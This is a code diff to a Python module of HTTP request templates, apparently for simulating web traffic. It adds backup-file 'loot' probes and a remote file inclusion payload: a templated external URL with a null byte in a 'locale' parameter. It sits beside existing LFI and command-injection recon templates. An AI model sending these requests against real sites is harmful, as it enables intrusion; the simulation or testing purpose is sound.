@@ -88,13 +88,33 @@ class js:
     )
 
 
+class generic:
+    seo_friendly_success = Interaction(
+        uri="__rand_app_page_name__", append_extension=False
+    )
+    noise_sucess = Interaction(
+        uri="__rand_noise__",
+        set_as_last=False,
+        append_extension=False,
+    )
+    old_loot_success = Interaction(
+        uri="__loot__.__backup_ext__", append_extension=False, set_as_last=False
+    )
+    old_loot_404 = Interaction(
+        uri="__loot__.__backup_ext__",
+        append_extension=False,
+        status_code=404,
+        set_as_last=False,
+    )
+
+
 class dynamic:
     login_success = Interaction(
         uri="login",
     )
 
     index_seo_friendly_success = Interaction(
-        uri="index.__app_extension__/__rand_app_page_name__", append_extension=False
+        uri="index__app_extension__/__rand_app_page_name__", append_extension=False
     )
 
     xmlrpc_success = Interaction(uri="xmlrpc", method="POST", set_as_last=False)
@@ -138,6 +158,10 @@ class dynamic:
     )
     faq_success = Interaction(uri="faq", query="locale=english")
     faq_lfi = Interaction(uri="faq", query="locale=__rand_str__")
+    faq_rfi = Interaction(
+        uri="faq",
+        query="locale=http://__rand_str__.io:__rand_int__/__rand_str____app_extension__.txt%00",
+    )
     sticky_page_500 = Interaction(uri="__rand_sticky_str__", status_code=500)
     cmd_injection_on_sticky_page_recon = Interaction(
         uri="__rand_sticky_str__", query="cmd=__rand_cmd_recon__"
